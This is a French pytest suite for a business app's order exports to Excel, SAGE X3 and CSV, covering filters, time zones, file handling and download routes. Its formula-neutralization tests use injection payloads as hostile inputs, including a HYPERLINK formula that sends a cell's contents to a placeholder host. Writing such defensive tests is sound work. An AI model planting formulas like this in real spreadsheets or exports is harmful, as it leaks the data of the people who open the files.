"""Exports des commandes (Excel standard, Excel SAGE X3, CSV, PDF) : contenu, filtres et fichiers.

Base temporaire, aucun service externe : les classeurs sont relus avec openpyxl, les CSV avec
le module csv.
"""

from __future__ import annotations

import csv
import io
import os
import threading
from dataclasses import replace
from pathlib import Path

import openpyxl
import pytest

from tecpap.reporting.analytics import (
    CONVERSION_SHEET_NAME,
    SAGE_SHEET_NAME,
    ExportFilterError,
    ReportGenerator,
)
from tecpap.reporting.spreadsheet import (
    is_formula_like,
    neutralize_csv_value,
    unique_export_path,
)

FORMULA_CLIENT = '=HYPERLINK("http://exemple.invalid/?d="&A2,"Ouvrir")'

# Fuseau horaire fixe UTC+1 (sans heure d'été) : les limites de jour ne dépendent pas des
# changements d'heure décidés pour un pays. « Etc/GMT-1 » signifie UTC+1 dans la base IANA.
FIXED_TIMEZONE = "Etc/GMT-1"


def _order(db, **overrides) -> int:
    data = {
        "entreprise_cliente": "Boulangerie Atlas",
        "type_produit": "Sachets fond plat",
        "quantite": 5000,
        "unite": "pièces",
        "prix_unitaire": 0.5,
        "prix_total": 2500.0,
        "devise": "MAD",
        "confiance": 90,
        "source": "email",
    }
    status = overrides.pop("statut", None)
    created_at = overrides.pop("created_at", None)
    data.update(overrides)
    order_id = db.create_order(data)
    if status:
        db.update_order_status(order_id, status)
    if created_at:
        db.connection.execute("UPDATE commandes SET created_at = ? WHERE id = ?", (created_at, order_id))
        db.connection.commit()
    return order_id


def _sheet_rows(path, sheet_name=SAGE_SHEET_NAME) -> list[dict]:
    worksheet = openpyxl.load_workbook(path)[sheet_name]
    rows = list(worksheet.iter_rows(values_only=True))
    return [dict(zip(rows[0], row, strict=True)) for row in rows[1:]]


def _csv_rows(text: str) -> list[dict]:
    return list(csv.DictReader(io.StringIO(text)))


@pytest.fixture
def generator(temp_db, test_settings):
    return ReportGenerator(temp_db, test_settings)


@pytest.fixture
def utc_plus_one(temp_db, test_settings):
    """Exports dans un fuseau horaire fixe UTC+1."""
    return ReportGenerator(temp_db, replace(test_settings, timezone=FIXED_TIMEZONE))


@pytest.fixture
def db(temp_db):
    return temp_db


class TestFormulaNeutralization:
    """Un texte qui commence comme une formule reste du texte dans les trois exports."""

    @pytest.mark.parametrize("value", ["=1+2", "+33 1", "-2+3", "@SUM(1,2)", "\t=1", "\r=1"])
    def test_dangerous_prefixes(self, value):
        assert is_formula_like(value)
        assert neutralize_csv_value(value) == "'" + value

    @pytest.mark.parametrize("value", ["Snack Atlas", "", "12-14 rue", 5000, -12.5, None])
    def test_other_values_are_unchanged(self, value):
        assert neutralize_csv_value(value) == value

    @pytest.fixture
    def injected(self, db):
        return _order(db, entreprise_cliente=FORMULA_CLIENT, nature_produit="=1+2", numero_commande="=2*3",
                      impression_client="@SUM(1,2)", statut="validee")

    def test_sage_workbook_has_no_formula(self, generator, injected):
        path = generator.export_to_excel_sage()
        worksheet = openpyxl.load_workbook(path)[SAGE_SHEET_NAME]
        cells = [cell for row in worksheet.iter_rows() for cell in row]
        assert all(cell.data_type != "f" for cell in cells)
        values = {cell.value for cell in cells}
        assert FORMULA_CLIENT in values and "=1+2" in values  # valeur gardée telle quelle, comme texte

    def test_standard_workbook_has_no_formula(self, generator, injected):
        worksheet = openpyxl.load_workbook(generator.export_to_excel())["Commandes"]
        cells = [cell for row in worksheet.iter_rows() for cell in row]
        assert all(cell.data_type != "f" for cell in cells)
        protected = [cell for cell in cells if cell.value == FORMULA_CLIENT]
        assert protected and protected[0].quotePrefix

    def test_numbers_stay_numeric(self, generator, injected):
        row = _sheet_rows(generator.export_to_excel_sage())[0]
        assert row["Qtée commandée US"] == 5000
        assert row["Prix total"] == 2500
        assert not isinstance(row["Prix total"], str)

    def test_csv_cells_never_start_with_a_formula(self, generator, injected):
        with open(generator.export_to_csv(), encoding="utf-8-sig", newline="") as handle:
            rows = list(csv.reader(handle))
        assert all(not is_formula_like(cell) for row in rows for cell in row)
        record = dict(zip(rows[0], rows[1], strict=True))
        assert record["client"] == "'" + FORMULA_CLIENT
        assert record["quantite"] == "5000.0"


class TestSageExport:
    """L'export SAGE X3 ne contient que des commandes validées, en unités de stock."""

    def test_only_validated_orders(self, generator, db):
        _order(db, entreprise_cliente="Client Validé", statut="validee")
        _order(db, entreprise_cliente="Client Rejeté", quantite=900000, statut="rejetee")
        _order(db, entreprise_cliente="Client En Attente")
        deleted = _order(db, entreprise_cliente="Client Supprimé")
        db.delete_order(deleted)

        rows = _sheet_rows(generator.export_to_excel_sage())
        assert [row["Raison sociale"] for row in rows] == ["Client Validé"]
        assert {row["Statut"] for row in rows} == {"validee"}

    @pytest.mark.parametrize("status", ["en_attente", "rejetee", "supprimee", "inconnu"])
    def test_other_status_is_refused(self, generator, status):
        with pytest.raises(ExportFilterError, match="validées"):
            generator.export_to_excel_sage(filters={"status": status})

    def test_validated_status_is_accepted(self, generator, db):
        _order(db, statut="validee")
        assert len(_sheet_rows(generator.export_to_excel_sage(filters={"status": "validee"}))) == 1

    def test_non_stock_units_go_to_conversion_sheet(self, generator, db):
        _order(db, entreprise_cliente="Snack Pieces", quantite=3000, unite="pièces", statut="validee")
        _order(db, entreprise_cliente="Snack US", quantite=2000, unite="US", statut="validee")
        _order(db, entreprise_cliente="Boulangerie Cartons", quantite=20, unite="carton", statut="validee")
        _order(db, entreprise_cliente="Epicerie Kilos", quantite=5, unite="kg", statut="validee")

        path = generator.export_to_excel_sage()
        importable = _sheet_rows(path)
        assert {row["Raison sociale"] for row in importable} == {"Snack Pieces", "Snack US"}
        assert {row["Unité"] for row in importable} == {"US"}

        to_convert = {row["Raison sociale"]: row for row in _sheet_rows(path, CONVERSION_SHEET_NAME)}
        assert set(to_convert) == {"Boulangerie Cartons", "Epicerie Kilos"}
        cartons = to_convert["Boulangerie Cartons"]
        assert (cartons["Qtée commandée"], cartons["Unité"]) == (20, "carton")
        assert "Qtée commandée US" not in cartons
        assert "US" in cartons["Action requise"]

    def test_no_conversion_sheet_when_every_unit_is_stock_unit(self, generator, db):
        _order(db, statut="validee")
        assert openpyxl.load_workbook(generator.export_to_excel_sage()).sheetnames == [SAGE_SHEET_NAME]

    def test_missing_number_and_date_use_reference_and_reception_day(self, utc_plus_one, db):
        order_id = _order(db, statut="validee", created_at="2026-10-24 23:30:00")
        _order(db, numero_commande="BC-2026-0417", date_commande="2026-10-20", statut="validee",
               created_at="2026-10-21 08:00:00")

        rows = {row["Numéro commande"]: row for row in _sheet_rows(utc_plus_one.export_to_excel_sage())}
        assert set(rows) == {f"CMD-{order_id}", "BC-2026-0417"}
        # 23:30 UTC le 24 octobre = 00:30 le 25 octobre en UTC+1.
        assert rows[f"CMD-{order_id}"]["Date commande"] == "2026-10-25"
        assert rows[f"CMD-{order_id}"]["Date création"] == "2026-10-25 00:30:00"
        assert rows["BC-2026-0417"]["Date commande"] == "2026-10-20"

    def test_reference_matches_assistant_reference(self, generator, db):
        from tecpap.chatbot.tools import order_reference

        order_id = _order(db, numero_commande="  ", statut="validee")
        row = _sheet_rows(generator.export_to_excel_sage())[0]
        assert row["Numéro commande"] == order_reference(None, order_id)

    def test_empty_export_keeps_headers(self, generator):
        worksheet = openpyxl.load_workbook(generator.export_to_excel_sage())[SAGE_SHEET_NAME]
        headers = next(worksheet.iter_rows(values_only=True))
        assert "Numéro commande" in headers and "Unité" in headers


class TestPeriodFilters:
    """« Date début » et « Date fin » sont des jours inclus, dans le fuseau horaire de l'entreprise."""

    @pytest.fixture
    def october(self, db):
        return {
            "start": _order(db, entreprise_cliente="Debut", statut="validee", created_at="2026-10-01 09:00:00"),
            "last_day": _order(db, entreprise_cliente="Fin", statut="validee", created_at="2026-10-31 14:32:05"),
            "next_day": _order(db, entreprise_cliente="Novembre", statut="validee", created_at="2026-11-01 10:00:00"),
            "before": _order(db, entreprise_cliente="Septembre", statut="validee", created_at="2026-09-30 10:00:00"),
        }

    @pytest.mark.parametrize("export", ["export_to_excel_sage", "export_to_excel", "export_to_csv"])
    def test_end_day_is_included(self, generator, october, export):
        filters = {"date_from": "2026-10-01", "date_to": "2026-10-31"}
        path = getattr(generator, export)(filters=filters)
        if export == "export_to_csv":
            with open(path, encoding="utf-8-sig", newline="") as handle:
                names = [row["client"] for row in csv.DictReader(handle)]
        elif export == "export_to_excel":
            names = [row["client"] for row in _sheet_rows(path, "Commandes")]
        else:
            names = [row["Raison sociale"] for row in _sheet_rows(path)]
        assert sorted(names) == ["Debut", "Fin"]

    def test_same_start_and_end_day(self, generator, october):
        rows = _sheet_rows(generator.export_to_excel_sage(filters={"date_from": "2026-10-31", "date_to": "2026-10-31"}))
        assert [row["Raison sociale"] for row in rows] == ["Fin"]

    def test_local_day_boundaries(self, utc_plus_one, db):
        # 23:30 UTC le 31 octobre = 00:30 le 1er novembre en UTC+1 : commande de novembre.
        _order(db, entreprise_cliente="Minuit", statut="validee", created_at="2026-10-31 23:30:00")
        october = utc_plus_one.export_to_excel_sage(filters={"date_from": "2026-10-01", "date_to": "2026-10-31"})
        november = utc_plus_one.export_to_excel_sage(filters={"date_from": "2026-11-01"})
        assert _sheet_rows(october) == []
        assert [row["Raison sociale"] for row in _sheet_rows(november)] == ["Minuit"]

    def test_iso_timestamp_with_t_separator(self, generator, db):
        _order(db, entreprise_cliente="Iso", statut="validee", created_at="2026-10-31T10:00:00")
        rows = _sheet_rows(generator.export_to_excel_sage(filters={"date_to": "2026-10-31"}))
        assert [row["Raison sociale"] for row in rows] == ["Iso"]

    @pytest.mark.parametrize("filters, message", [
        ({"date_from": "31/10/2026"}, "Date de début invalide"),
        ({"date_to": "2026-13-01"}, "Date de fin invalide"),
        ({"date_from": "2026-11-01", "date_to": "2026-10-01"}, "postérieure"),
        ({"status": "livree"}, "Statut inconnu"),
    ])
    def test_invalid_filters_are_refused(self, generator, filters, message):
        with pytest.raises(ExportFilterError, match=message):
            generator.export_to_excel(filters=filters)

    def test_deleted_orders_only_on_explicit_request(self, generator, db):
        _order(db, entreprise_cliente="Active")
        deleted = _order(db, entreprise_cliente="Supprimee")
        db.delete_order(deleted)
        default = [row["client"] for row in _sheet_rows(generator.export_to_excel(), "Commandes")]
        explicit = [row["client"] for row in
                    _sheet_rows(generator.export_to_excel(filters={"status": "supprimee"}), "Commandes")]
        assert default == ["Active"]
        assert explicit == ["Supprimee"]


class TestExportFiles:
    """Chaque export a son propre fichier : deux exports simultanés ne se mélangent pas."""

    def test_unique_paths_in_export_dir(self, generator, test_settings):
        first, second = generator.export_to_csv(), generator.export_to_csv()
        assert first != second
        assert Path(first).parent == Path(second).parent == Path(test_settings.export_dir)
        assert Path(first).name.startswith("commandes_") and first.endswith(".csv")

    def test_unique_export_path_creates_directory(self, tmp_path):
        path = unique_export_path(str(tmp_path / "exports" / "neuf"), "rapport.pdf")
        assert os.path.isfile(path) and path.endswith(".pdf")

    def test_explicit_path_is_used(self, generator, tmp_path):
        target = tmp_path / "sortie" / "mon_export.csv"
        assert generator.export_to_csv(filepath=str(target)) == str(target)
        assert target.exists()

    def test_refused_filter_leaves_no_file(self, generator, test_settings):
        with pytest.raises(ExportFilterError):
            generator.export_to_csv(filters={"date_to": "hier"})
        export_dir = Path(test_settings.export_dir)
        assert not export_dir.exists() or list(export_dir.iterdir()) == []

    def test_concurrent_exports_keep_their_own_rows(self, generator, db):
        _order(db, entreprise_cliente="Validee", statut="validee")
        for index in range(30):
            _order(db, entreprise_cliente=f"Attente {index}")

        results: dict[str, str] = {}
        barrier = threading.Barrier(2)

        def export(name, filters):
            barrier.wait()
            path = generator.export_to_csv(filters=filters)
            with open(path, encoding="utf-8-sig", newline="") as handle:
                results[name] = handle.read()

        threads = [threading.Thread(target=export, args=("validees", {"status": "validee"})),
                   threading.Thread(target=export, args=("toutes", None))]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        assert [row["client"] for row in _csv_rows(results["validees"])] == ["Validee"]
        assert len(_csv_rows(results["toutes"])) == 31


class TestExportRoutes:
    """Routes de téléchargement : filtres du formulaire, erreurs expliquées, aucun fichier laissé."""

    @pytest.fixture
    def orders(self, services):
        db = services.db
        return {
            "validated": _order(db, entreprise_cliente="Ancienne", statut="validee", created_at="2020-01-15 10:00:00"),
            "recent": _order(db, entreprise_cliente="Recente", statut="validee", created_at="2026-10-10 10:00:00"),
            "pending": _order(db, entreprise_cliente="Attente", created_at="2026-10-11 10:00:00"),
            "rejected": _order(db, entreprise_cliente="Rejetee", statut="rejetee", created_at="2026-10-12 10:00:00"),
        }

    def test_csv_respects_every_filter(self, flask_client, orders):
        response = flask_client.get("/export/csv?status=validee&date_from=2026-10-01&date_to=2026-10-15")
        assert response.status_code == 200
        assert [row["client"] for row in _csv_rows(response.data.decode("utf-8-sig"))] == ["Recente"]

    def test_csv_period_without_status_excludes_nothing_but_deleted(self, flask_client, orders):
        response = flask_client.get("/export/csv?date_from=2026-10-01&date_to=2026-10-15")
        names = sorted(row["client"] for row in _csv_rows(response.data.decode("utf-8-sig")))
        assert names == ["Attente", "Recente", "Rejetee"]

    def test_default_sage_download_contains_only_validated_orders(self, flask_client, orders):
        response = flask_client.get("/export/excel/sage")
        assert response.status_code == 200
        workbook = openpyxl.load_workbook(io.BytesIO(response.data))
        rows = list(workbook[SAGE_SHEET_NAME].iter_rows(values_only=True))
        header = rows[0]
        statuses = {row[header.index("Statut")] for row in rows[1:]}
        assert statuses == {"validee"} and len(rows) == 3

    def test_sage_period_filter(self, flask_client, orders):
        response = flask_client.get("/export/excel/sage?date_from=2026-10-01&date_to=2026-10-31")
        rows = list(openpyxl.load_workbook(io.BytesIO(response.data))[SAGE_SHEET_NAME].iter_rows(values_only=True))
        assert len(rows) == 2

    def test_sage_with_other_status_explains_refusal(self, flask_client, orders):
        response = flask_client.get("/export/excel/sage?status=en_attente")
        assert response.status_code == 400
        assert "ne contient que les commandes validées" in response.data.decode("utf-8")

    @pytest.mark.parametrize("url", ["/export/csv?date_from=2026-02-30", "/export/excel?date_to=demain",
                                     "/export/excel?date_from=2026-10-15&date_to=2026-10-01"])
    def test_invalid_period_gives_explained_400(self, flask_client, orders, url):
        response = flask_client.get(url)
        assert response.status_code == 400
        assert "Export impossible" in response.data.decode("utf-8")

    @pytest.mark.parametrize("url", ["/export/csv", "/export/excel", "/export/excel/sage", "/export/pdf",
                                     "/export/excel/sage?status=rejetee"])
    def test_no_file_left_in_export_dir(self, flask_client, test_settings, orders, url):
        flask_client.get(url)
        export_dir = Path(test_settings.export_dir)
        assert not export_dir.exists() or list(export_dir.iterdir()) == []

    def test_csv_download_has_no_formula_cell(self, flask_client, services):
        _order(services.db, entreprise_cliente=FORMULA_CLIENT)
        rows = list(csv.reader(io.StringIO(flask_client.get("/export/csv").data.decode("utf-8-sig"))))
        assert all(not is_formula_like(cell) for row in rows for cell in row)
